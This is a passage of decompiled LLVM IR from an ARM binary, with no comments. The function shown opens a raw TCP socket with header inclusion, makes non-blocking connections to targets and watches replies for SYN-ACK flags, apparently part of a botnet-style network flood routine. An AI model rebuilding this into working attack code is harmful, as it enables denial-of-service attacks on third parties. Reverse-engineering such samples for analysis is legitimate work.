  %v2_c4d4 = load i32, i32* @r6, align 4
  %v3_c4d4 = add i32 %v2_c4d4, 16
  %v4_c4d4 = inttoptr i32 %v3_c4d4 to i32*
  store i32 %v1_c4d4, i32* %v4_c4d4, align 4
  br label %dec_label_pc_c2f4

dec_label_pc_c4dc:                                ; preds = %dec_label_pc_c2e0, %bb101
  %v0_c4dc = call i32 @function_117dc()
  store i32 %v0_c4dc, i32* %r0.global-to-local, align 4
  store i32 %v1_bf10, i32* %r3.global-to-local, align 4
  store i1 %v2_c4e4, i1* %cpsr_z.global-to-local, align 1
  %v1_c4e8 = load i32, i32* @r6, align 4
  %v2_c4e8 = add i32 %v1_c4e8, 16
  %v3_c4e8 = inttoptr i32 %v2_c4e8 to i32*
  store i32 %v0_c4dc, i32* %v3_c4e8, align 4
  br i1 %v2_c4e4, label %dec_label_pc_c300, label %dec_label_pc_c4f0

dec_label_pc_c4f0:                                ; preds = %dec_label_pc_c2f4, %dec_label_pc_c4dc
  %v0_c4f0 = load i32, i32* @r7, align 4
  %v1_c4f0 = add i32 %v0_c4f0, 8
  store i32 %v1_c4f0, i32* %r0.global-to-local, align 4
  store i32 %v5_bef0, i32* @r1, align 4
  %v1_c4f8 = inttoptr i32 %v1_c4f0 to i8*
  %v2_c4f8 = call i32 @function_119b8(i8* %v1_c4f8)
  store i32 %v2_c4f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c300

dec_label_pc_c500:                                ; preds = %dec_label_pc_bf90
  %v1_c508 = add i32 %v5_bef0, 8
  store i32 %v1_c508, i32* %r2.global-to-local, align 4
  %v1_c50c = add i32 %v5_bef0, 52
  store i32 %v1_c50c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_c26c.preheader

; uselistorder directives
  uselistorder i32 %v1_c50c, { 1, 0 }
  uselistorder i32 %v1_c508, { 1, 0 }
  uselistorder i32 %v4_c4c0, { 1, 0 }
  uselistorder i32 %v0_c4b8, { 0, 2, 1 }
  uselistorder i32 %v0_c49c, { 0, 2, 1 }
  uselistorder i32 %v2_c43c, { 1, 0 }
  uselistorder i32 %v8_c41c, { 1, 2, 0 }
  uselistorder i32 %v0_c3f8, { 1, 0, 2 }
  uselistorder i32 %v1_c3c4, { 1, 2, 0 }
  uselistorder i32 %v1_c3c0, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_c364, { 1, 0, 2 }
  uselistorder i32 %v4_c360, { 0, 2, 1 }
  uselistorder i32 %v0_c340, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_c330, { 0, 2, 1 }
  uselistorder i32 %v4_c314, { 1, 0 }
  uselistorder i32 %v7_c298, { 1, 0, 2 }
  uselistorder i32 %v0_c26c, { 1, 0 }
  uselistorder i1 %v7_c2b0, { 2, 1, 0 }
  uselistorder i1 %v2_c4e4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_c22c, { 1, 0, 2 }
  uselistorder i32 %v0_c1f0, { 1, 0, 2 }
  uselistorder i32 %v3_c0a4, { 0, 2, 1 }
  uselistorder i32 %v3_c064, { 1, 0 }
  uselistorder i32 %tmp86, { 1, 0 }
  uselistorder i32 %v1_c01c, { 1, 0 }
  uselistorder i32 %v1_bff8, { 1, 0 }
  uselistorder i32 %v1_bff4, { 0, 2, 1 }
  uselistorder i32 %v3_bfd8, { 2, 1, 0 }
  uselistorder i32 %v0_bfb4, { 1, 0, 2 }
  uselistorder i32 %v1_bfa4, { 5, 3, 4, 1, 2, 0 }
  uselistorder i32 %v0_bfa0, { 0, 3, 2, 1 }
  uselistorder i32 %v0_bf9c, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_bf88, { 1, 0 }
  uselistorder i1 %v7_bf5c, { 1, 0 }
  uselistorder i32 %v3_bf58, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v5_bf44, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bf10, { 1, 0, 2 }
  uselistorder i32 %v5_bef0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8 %v5_be94, { 1, 0 }
  uselistorder i32 %v2_be24, { 0, 3, 1, 2 }
  uselistorder i32 %v1_be08, { 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 38, 40, 39, 42, 41, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 6, 7, 4, 5, 9, 8, 10, 13, 11, 12, 14, 16, 15, 17, 18, 23, 19, 20, 21, 22, 26, 24, 25, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29 }
  uselistorder i8 47, { 9, 8, 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_c4f0, { 1, 0 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
  uselistorder label %bb101, { 1, 0 }
  uselistorder label %dec_label_pc_c3dc, { 1, 0 }
  uselistorder label %dec_label_pc_c300, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c26c.preheader, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %bb93, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %.thread23, { 2, 1, 0 }
}

define i32 @function_c520(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c520:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp39 = call i8 @__decompiler_undefined_function_1()
  %tmp40 = call i8 @__decompiler_undefined_function_1()
  %tmp41 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_c520 = load i32, i32* @r4, align 4
  %v1_c524 = urem i32 %arg1, 256
  store i32 %v1_c524, i32* @fp, align 4
  store i32 %v1_c524, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_c53c = urem i32 %arg3, 256
  store i32 %v1_c53c, i32* @r4, align 4
  %v2_c540 = call i32 @_calloc(i32 %v1_c524, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_c54c = load i32, i32* @fp, align 4
  store i32 %v0_c54c, i32* %r0.global-to-local, align 4
  %v2_c550 = call i32 @_calloc(i32 %v0_c54c, i32 4)
  %v0_c554 = load i32, i32* @r5, align 4
  store i32 %v0_c554, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c564 = load i32, i32* @r4, align 4
  store i32 %v0_c564, i32* %r0.global-to-local, align 4
  %v5_c568 = inttoptr i32 %v0_c554 to i32*
  %v6_c568 = call i32 @function_b240(i32 %v0_c564, i32* %v5_c568, i32 2, i32 0)
  %v1_c574 = urem i32 %v6_c568, 256
  store i32 %v1_c574, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c580 = load i32, i32* @r5, align 4
  store i32 %v0_c580, i32* %r1.global-to-local, align 4
  %v0_c584 = load i32, i32* @r4, align 4
  store i32 %v0_c584, i32* %r0.global-to-local, align 4
  %v6_c58c = inttoptr i32 %v0_c580 to i32*
  %v7_c58c = call i32 @function_b240(i32 %v0_c584, i32* %v6_c58c, i32 3, i32 65535)
  %v0_c590 = load i32, i32* @r5, align 4
  store i32 %v0_c590, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_c58c, i32* @r6, align 4
  %v0_c5a0 = load i32, i32* @r4, align 4
  store i32 %v0_c5a0, i32* %r0.global-to-local, align 4
  %v4_c5a4 = inttoptr i32 %v0_c590 to i32*
  %v5_c5a4 = call i32 @function_b240(i32 %v0_c5a0, i32* %v4_c5a4, i32 4, i32 64)
  %v1_c5ac = urem i32 %v5_c5a4, 256
  store i32 %v1_c5ac, i32* %ip.global-to-local, align 4
  %v0_c5b0 = load i32, i32* @r5, align 4
  store i32 %v0_c5b0, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c5bc = load i32, i32* @r4, align 4
  store i32 %v0_c5bc, i32* %r0.global-to-local, align 4
  %v6_c5c4 = inttoptr i32 %v0_c5b0 to i32*
  %v7_c5c4 = call i32 @function_b240(i32 %v0_c5bc, i32* %v6_c5c4, i32 5, i32 1)
  %v1_c5d0 = urem i32 %v7_c5c4, 256
  store i32 %v1_c5d0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_c5d8 = load i32, i32* @r5, align 4
  store i32 %v0_c5d8, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_c5e0 = load i32, i32* @r4, align 4
  store i32 %v0_c5e0, i32* %r0.global-to-local, align 4
  %v5_c5e8 = inttoptr i32 %v0_c5d8 to i32*
  %v6_c5e8 = call i32 @function_b240(i32 %v0_c5e0, i32* %v5_c5e8, i32 7, i32 65535)
  %v0_c5ec = load i32, i32* @r5, align 4
  store i32 %v0_c5ec, i32* %r1.global-to-local, align 4
  %v3_c5f0 = mul i32 %v6_c5e8, 65536
  store i32 %v3_c5f0, i32* @r7, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c5fc = load i32, i32* @r4, align 4
  store i32 %v0_c5fc, i32* %r0.global-to-local, align 4
  %v4_c600 = inttoptr i32 %v0_c5ec to i32*
  %v5_c600 = call i32 @function_b240(i32 %v0_c5fc, i32* %v4_c600, i32 11, i32 0)
  %v1_c608 = urem i32 %v5_c600, 256
  store i32 %v1_c608, i32* %ip.global-to-local, align 4
  %v0_c60c = load i32, i32* @r5, align 4
  store i32 %v0_c60c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c618 = load i32, i32* @r4, align 4
  store i32 %v0_c618, i32* %r0.global-to-local, align 4
  %v5_c620 = inttoptr i32 %v0_c60c to i32*
  %v6_c620 = call i32 @function_b240(i32 %v0_c618, i32* %v5_c620, i32 12, i32 1)
  %v1_c628 = urem i32 %v6_c620, 256
  store i32 %v1_c628, i32* %ip.global-to-local, align 4
  %v0_c62c = load i32, i32* @r5, align 4
  store i32 %v0_c62c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c638 = load i32, i32* @r4, align 4
  store i32 %v0_c638, i32* %r0.global-to-local, align 4
  %v5_c640 = inttoptr i32 %v0_c62c to i32*
  %v6_c640 = call i32 @function_b240(i32 %v0_c638, i32* %v5_c640, i32 13, i32 1)
  %v1_c648 = urem i32 %v6_c640, 256
  store i32 %v1_c648, i32* %ip.global-to-local, align 4
  %v0_c64c = load i32, i32* @r5, align 4
  store i32 %v0_c64c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c658 = load i32, i32* @r4, align 4
  store i32 %v0_c658, i32* %r0.global-to-local, align 4
  %v5_c660 = inttoptr i32 %v0_c64c to i32*
  %v6_c660 = call i32 @function_b240(i32 %v0_c658, i32* %v5_c660, i32 14, i32 0)
  %v1_c668 = urem i32 %v6_c660, 256
  store i32 %v1_c668, i32* %ip.global-to-local, align 4
  %v0_c66c = load i32, i32* @r5, align 4
  store i32 %v0_c66c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c678 = load i32, i32* @r4, align 4
  store i32 %v0_c678, i32* %r0.global-to-local, align 4
  %v5_c680 = inttoptr i32 %v0_c66c to i32*
  %v6_c680 = call i32 @function_b240(i32 %v0_c678, i32* %v5_c680, i32 15, i32 0)
  %v1_c688 = urem i32 %v6_c680, 256
  store i32 %v1_c688, i32* %ip.global-to-local, align 4
  %v0_c68c = load i32, i32* @r5, align 4
  store i32 %v0_c68c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c698 = load i32, i32* @r4, align 4
  store i32 %v0_c698, i32* %r0.global-to-local, align 4
  %v5_c6a0 = inttoptr i32 %v0_c68c to i32*
  %v6_c6a0 = call i32 @function_b240(i32 %v0_c698, i32* %v5_c6a0, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_c6a0, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %r1.global-to-local, align 4
  %v0_c6b4 = load i32, i32* @r4, align 4
  store i32 %v0_c6b4, i32* %r0.global-to-local, align 4
  %v1_c6b8 = urem i32 %v6_c6a0, 256
  store i32 %v1_c6b8, i32* @r8, align 4
  %v4_c6bc = inttoptr i32 %v0_c6b0 to i32*
  %v5_c6bc = call i32 @function_b240(i32 %v0_c6b4, i32* %v4_c6bc, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c6c8 = load i32, i32* @r5, align 4
  store i32 %v0_c6c8, i32* %r1.global-to-local, align 4
  store i32 %v5_c6bc, i32* @sb, align 4
  %v0_c6d0 = load i32, i32* @r4, align 4
  store i32 %v0_c6d0, i32* %r0.global-to-local, align 4
  %v4_c6d4 = inttoptr i32 %v0_c6c8 to i32*
  %v5_c6d4 = call i32 @function_b240(i32 %v0_c6d0, i32* %v4_c6d4, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_c6e0 = urem i32 %v5_c6d4, 256
  store i32 %v1_c6e0, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_c6f0 = call i32 @_socket(i32 2, i32 3, i32 6)
  store i32 %v3_c6f0, i32* %r0.global-to-local, align 4
  %v0_c6f4 = load i32, i32* @r7, align 4
  %v3_c6f4 = udiv i32 %v0_c6f4, 65536
  store i32 %v3_c6f4, i32* %r1.global-to-local, align 4
  %v7_c6f8 = icmp eq i32 %v3_c6f0, -1
  store i1 %v7_c6f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c6f8, label %dec_label_pc_c97c, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c520
  store i32 1, i32* %stack_var_-40, align 4
  %v6_c710 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_c710, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c724 = call i32 @_setsockopt(i32 %v3_c6f0, i32 0, i32 3, i32 %v6_c710, i32 4)
  store i32 %v5_c724, i32* %r0.global-to-local, align 4
  %v7_c728 = icmp eq i32 %v5_c724, -1
  store i1 %v7_c728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c728, label %dec_label_pc_c974, label %dec_label_pc_c730

dec_label_pc_c730:                                ; preds = %dec_label_pc_c708
  %v0_c730 = load i32, i32* @fp, align 4
  %v2_c730 = icmp eq i32 %v0_c730, 0
  store i1 %v2_c730, i1* %cpsr_z.global-to-local, align 1
  %v0_c734 = load i32, i32* @r6, align 4
  %v3_c734 = mul i32 %v0_c734, 65536
  store i32 %v3_c734, i32* %r0.global-to-local, align 4
  %v3_c738 = urem i32 %v0_c734, 65536
  store i32 %v3_c738, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp84 = icmp slt i32 %v0_c730, 1
  br i1 %tmp84, label %.thread26, label %dec_label_pc_c75c.preheader

.thread26:                                        ; preds = %dec_label_pc_c730
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_cbfc

dec_label_pc_c75c.preheader:                      ; preds = %dec_label_pc_c730
  %v5_c740 = load i32, i32* @r7, align 4
  %v8_c740 = udiv i32 %v5_c740, 16777216
  %tmp85 = udiv i32 %v0_c734, 256
  %v8_c744 = urem i32 %tmp85, 256
  store i32 %v8_c744, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_c768 = urem i32 %v0_c734, 256
  %v3_c854 = icmp ugt i32 %v0_c6f4, -65537
  %v2_c878 = ptrtoint i32* %stack_var_-60 to i32
  %v4_c894 = mul nuw nsw i32 %v1_c768, 256
  %v5_c894 = or i32 %v8_c744, %v4_c894
  %sext10 = mul i32 %tmp85, 16777216
  %v4_c8a0 = sdiv i32 %sext10, 16777216
  %v3_c8a8 = ashr i32 %sext10, 31
  %v2_c8cc = ptrtoint i32* %stack_var_-76 to i32
  %v2_c8d8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_c8dc = ptrtoint i32* %stack_var_-44 to i32
  %v4_c924 = zext i8 %tmp40 to i32
  %v4_c928 = zext i8 %tmp39 to i32
  %v4_c934 = mul nuw nsw i32 %v4_c928, 256
  %v4_c944 = zext i8 %tmp to i32
  %v1_c948 = and i32 %v4_c944, 18
  %v2_c94c = icmp eq i32 %v1_c948, 18
  %v1_c864 = mul nuw nsw i32 %v3_c6f4, 256
  %v4_c868 = and i32 %v1_c864, 65280
  %v5_c868 = or i32 %v8_c740, %v4_c868
  %v3_c86c106 = udiv i32 %v4_c868, 256
  %v1_c870 = trunc i32 %v3_c86c106 to i8
  %sext = mul i32 %v6_c568, 16777216
  %v4_ca70 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v5_c5a4, 16777216
  %v4_ca84 = sdiv i32 %sext8, 16777216
  %v5_c934 = or i32 %v4_c924, %v4_c934
  %v1_c954 = and i32 %v4_c944, 5
  %v2_c954 = icmp eq i32 %v1_c954, 0
  %v1_c874 = trunc i32 %v8_c740 to i8
  %v1_ca80 = trunc i32 %v4_ca70 to i8
  %v1_cb4c = urem i32 %v5_c600, 2
  %tmp107 = sub nsw i32 0, %v1_cb4c
  %v4_cb54 = and i32 %tmp107, 32
  %v1_cb64 = urem i32 %v6_c620, 2
  %tmp108 = sub nsw i32 0, %v1_cb64
  %v4_cb6c = and i32 %tmp108, 16
  %v1_cb7c = urem i32 %v6_c640, 2
  %tmp109 = sub nsw i32 0, %v1_cb7c
  %v4_cb84 = and i32 %tmp109, 8
  %v1_cb94 = urem i32 %v6_c660, 2
  %tmp110 = sub nsw i32 0, %v1_cb94
  %v4_cb9c = and i32 %tmp110, 4
  %v1_cbac = urem i32 %v6_c680, 2
  %tmp111 = sub nsw i32 0, %v1_cbac
  %v3_cbb4 = and i32 %tmp111, 2
  br label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %dec_label_pc_cbe8, %dec_label_pc_c95c, %dec_label_pc_c75c.preheader
  store i32 %v8_c744, i32* %r3.global-to-local, align 4
  store i32 %v1_c768, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @sb, align 4
  %v1_c774 = add i32 %v0_c774, 40
  store i32 %v1_c774, i32* @sl, align 4
  br label %dec_label_pc_c778

dec_label_pc_c778:                                ; preds = %dec_label_pc_c968, %dec_label_pc_c75c
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c784 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_c784, i32* %r0.global-to-local, align 4
  %v7_c788 = icmp eq i32 %v3_c784, -1
  store i1 %v7_c788, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c784, i32* @r7, align 4
  br i1 %v7_c788, label %dec_label_pc_cbe8, label %dec_label_pc_c794

dec_label_pc_c794:                                ; preds = %dec_label_pc_c778
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c79c = call i32 @_fcntl(i32 %v3_c784, i32 3, i32 0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_c7a4 = or i32 %v3_c79c, 2048
  store i32 %v1_c7a4, i32* %r2.global-to-local, align 4
  %v0_c7a8 = load i32, i32* @r7, align 4
  store i32 %v0_c7a8, i32* %r0.global-to-local, align 4
  %v3_c7ac = call i32 @_fcntl(i32 %v0_c7a8, i32 4, i32 %v1_c7a4)
  %v3_c7b0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_c7b0, i32* %ip.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v5_c7cc = mul i32 %v3_c7b0, 24
  store i32 %v5_c7cc, i32* %r1.global-to-local, align 4
  %v2_c7d0 = add i32 %v5_c7cc, %arg2
  store i32 %v2_c7d0, i32* %r2.global-to-local, align 4
  %v1_c7d4 = add i32 %v2_c7d0, 20
  %v2_c7d4 = inttoptr i32 %v1_c7d4 to i8*
  %v3_c7d4 = load i8, i8* %v2_c7d4, align 1
  %v4_c7d4 = zext i8 %v3_c7d4 to i32
  store i32 %v4_c7d4, i32* %r3.global-to-local, align 4
  %v2_c7d8 = icmp ugt i8 %v3_c7d4, 30
  %v7_c7d8 = icmp eq i8 %v3_c7d4, 31
  store i1 %v7_c7d8, i1* %cpsr_z.global-to-local, align 1
  %v2_c7dc = xor i1 %v7_c7d8, true
  %v3_c7dc = and i1 %v2_c7d8, %v2_c7dc
  %v5_c7dc = add i32 %v2_c7d0, 16
  %v6_c7dc = inttoptr i32 %v5_c7dc to i32*
  %v7_c7dc = load i32, i32* %v6_c7dc, align 4
  br i1 %v3_c7dc, label %dec_label_pc_c848, label %dec_label_pc_c7e8

dec_label_pc_c7e8:                                ; preds = %dec_label_pc_c794
  store i32 %v7_c7dc, i32* %r4.global-to-local, align 4
  %v0_c7ec = call i32 @function_117dc()
  store i32 %v0_c7ec, i32* %r0.global-to-local, align 4
  %v3_c7f0 = load i32, i32* %stack_var_-40, align 4
  %v5_c7f8 = mul i32 %v3_c7f0, 24
  %v2_c804 = add i32 %v5_c7f8, %arg2
  store i32 %v2_c804, i32* %r1.global-to-local, align 4
  %v1_c800 = udiv i32 %v7_c7dc, 256
  %v3_c808 = and i32 %v1_c800, 65280
  store i32 %v3_c808, i32* %r2.global-to-local, align 4
  %v1_c80c = and i32 %v7_c7dc, 65280
  store i32 %v1_c80c, i32* %r3.global-to-local, align 4
  %v3_c810 = mul i32 %v7_c7dc, 16777216
  store i32 %v3_c810, i32* %ip.global-to-local, align 4
  %v1_c814 = add i32 %v2_c804, 20
  %v2_c814 = inttoptr i32 %v1_c814 to i8*
  %v3_c814 = load i8, i8* %v2_c814, align 1
  %v4_c814 = zext i8 %v3_c814 to i32
  store i32 %v4_c814, i32* %lr.global-to-local, align 4
  %v4_c818 = mul nuw nsw i32 %v1_c80c, 256
  %v5_c818 = or i32 %v4_c818, %v3_c810
  store i32 %v5_c818, i32* %ip.global-to-local, align 4
  %v2_c820 = call i32 @llvm.bswap.i32(i32 %v7_c7dc)
  %v7_c824 = lshr i32 %v0_c7ec, %v4_c814
  %v8_c824 = add i32 %v7_c824, %v2_c820
  store i32 %v8_c824, i32* %r2.global-to-local, align 4
  %v3_c830 = mul i32 %v8_c824, 16777216
  %v1_c834 = and i32 %v8_c824, 65280
  store i32 %v1_c834, i32* %r0.global-to-local, align 4
  %v4_c838 = mul nuw nsw i32 %v1_c834, 256
  %v5_c838 = or i32 %v4_c838, %v3_c830
  store i32 %v5_c838, i32* %r1.global-to-local, align 4
  %v2_c840 = call i32 @llvm.bswap.i32(i32 %v8_c824)
  br label %dec_label_pc_c848

dec_label_pc_c848:                                ; preds = %dec_label_pc_c794, %dec_label_pc_c7e8
  %storemerge34 = phi i32 [ %v2_c840, %dec_label_pc_c7e8 ], [ %v7_c7dc, %dec_label_pc_c794 ]
  store i32 %v3_c6f4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_c854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c854, label %dec_label_pc_c984, label %dec_label_pc_c85c

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c848
  store i32 %v3_c6f4, i32* %r0.global-to-local, align 4
  store i32 %v8_c740, i32* %r1.global-to-local, align 4
  store i32 %v5_c868, i32* %r3.global-to-local, align 4
  store i32 %v3_c86c106, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c878

dec_label_pc_c878:                                ; preds = %dec_label_pc_c984, %dec_label_pc_c85c
  %stack_var_-57.0 = phi i8 [ %v1_c98c, %dec_label_pc_c984 ], [ %v1_c870, %dec_label_pc_c85c ]
  %storemerge = phi i8 [ %v1_c984, %dec_label_pc_c984 ], [ %v1_c874, %dec_label_pc_c85c ]
  store i32 %v2_c878, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_c880 = load i32, i32* @r7, align 4
  store i32 %v0_c880, i32* %r0.global-to-local, align 4
  %v3_c884 = call i32 @_connect(i32 %v0_c880, i32 %v2_c878, i32 16)
  store i32 %v1_c768, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v5_c894, i32* %r2.global-to-local, align 4
  %v1_c89c = call i32 @_time(i32 0)
  store i32 %v1_c89c, i32* %r0.global-to-local, align 4
  store i32 %v1_c89c, i32* %r4.global-to-local, align 4
  store i32 %v3_c8a8, i32* %ip.global-to-local, align 4
  %v9_c908 = icmp eq i32 %tmp41, %storemerge34
  %v4_c92c = zext i8 %storemerge to i32
  %v4_c930 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_c908 to i32
  %v9_c91c = icmp eq i1 %v9_c908, false
  %v4_c938 = mul nuw nsw i32 %v4_c930, 256
  %v5_c938 = or i32 %v4_c938, %v4_c92c
  %v9_c93c = icmp eq i32 %v5_c938, %v5_c934
  br label %dec_label_pc_c8c4

dec_label_pc_c8b4:                                ; preds = %.thread32, %dec_label_pc_c924, %dec_label_pc_c954, %bb87
  %v1_c8b4 = call i32 @_time(i32 0)
  %v0_c8b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_c8b8 = sub i32 %v1_c8b4, %v0_c8b8
  store i32 %v2_c8b8, i32* %r0.global-to-local, align 4
  %v7_c8bc = icmp eq i32 %v2_c8b8, 10
  store i1 %v7_c8bc, i1* %cpsr_z.global-to-local, align 1
  %v8_c8c0 = icmp sgt i32 %v2_c8b8, 10
  br i1 %v8_c8c0, label %dec_label_pc_c968, label %dec_label_pc_c8c4

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c878
  store i32 16, i32* %stack_var_-44, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_c8d8, i32* %r1.global-to-local, align 4
  store i32 %v2_c8dc, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c6f0, i32* %r0.global-to-local, align 4
  %v6_c8ec = call i32 @_recvfrom(i32 %v3_c6f0, i32 %v2_c8d8, i32 256, i32 16384, i32 %v2_c8cc, i32 %v2_c8dc)
  store i32 %v6_c8ec, i32* %r2.global-to-local, align 4
  %v7_c8f4 = icmp eq i32 %v6_c8ec, -1
  store i1 %v7_c8f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
